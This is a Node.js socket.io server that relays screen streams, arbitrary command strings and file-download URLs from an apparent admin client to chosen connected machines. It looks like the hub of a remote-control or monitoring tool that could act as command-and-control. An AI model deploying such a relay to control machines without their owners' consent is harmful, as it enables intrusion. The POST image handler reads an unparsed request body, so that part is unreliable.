const express = require('express');
const port = process.env.PORT || 3000;
var app = new express();
var http = require("http").Server(app);
var io = require("socket.io")(http);
app.use(express.static(__dirname + "/public"));
app.get('/', function (req, res) {
    res.redirect('visualize.html');
});
var fs = require('fs');
var adminSocketID;

io.on('connection', async function (socket) {
    var sId = socket.id;
    console.log('Client ' + sId.toString() + ' connected')
    socket.broadcast.emit('oneConnect', sId);
    socket.on('callServer', async function () {
        await socket.broadcast.emit('callClient');
    });
    socket.on('browserReply', async function (data) {
        adminSocketID = socket.id;
        await socket.broadcast.emit('server', 'ON');
    });
    socket.on('deleteLog', async function () {
        try {
            fs.open('./public/logEr.txt', 'w', function (err, file) {
                if (err) throw err;
                console.log('File renew');
              }); 
            
        } catch (error) {
            
        }
    });
    socket.on('Error', async function (data) {
        fs.appendFile('./public/logEr.txt', data + '\n', function (err) {
            if (err) throw err;
        });
        await socket.broadcast.emit('showErr', [data, sId]);
    });
    socket.on('stream', async function (data) {
        var id_img = [socket.id, data]
        await socket.broadcast.emit('stream', id_img);
    });
    socket.on('disconnect', async function () {
        if (socket.id == adminSocketID) {
            await socket.broadcast.emit('adminleft', 'Admin leave');
        }
        else {
            await socket.broadcast.emit('oneLeft', socket.id);
        }
    });

    socket.on('downspeed', async function (id) {
        console.log(id);
        await socket.to(id).emit('downspeed', 'Speed down');
    });
    socket.on('Logoff', async function (id) {
        await socket.to(id).emit('logoff', 'Off');
    });
    socket.on('Login', async function (id) {
        await socket.to(id).emit('login', 'Off');
    });
    socket.on('command', async function (cmd_id) {
        // Format : command|time
        var cmd = cmd_id[0];
        var id = cmd_id[1];

        console.log(cmd);
        console.log(id);
        await socket.to(id).emit('command', cmd);
    });
    socket.on('sendFile', async function (plug_id) {
        // Format : Url|name to save
        var plug = plug_id[0];
        var id = plug_id[1];
        await socket.to(id).emit('sendFile', plug);
    });
    socket.on('upspeed', async function (id) {
        console.log(id);
        await socket.to(id).emit('upspeed', 'Speed up');
    });
});
app.post('/', (req, res) => {
    var data = req.body.img;
    imgbase64 = data.substr(2, data.length - 3);
    fs.writeFile('./public/client.txt', imgbase64,//'base64',
        function (err, data) {
            if (err) {
                console.log(err);
            }
        });
    console.log('Recv')
    res.send('ok')
})
http.listen(port, function () {
    console.log("Server running at port " + port);
});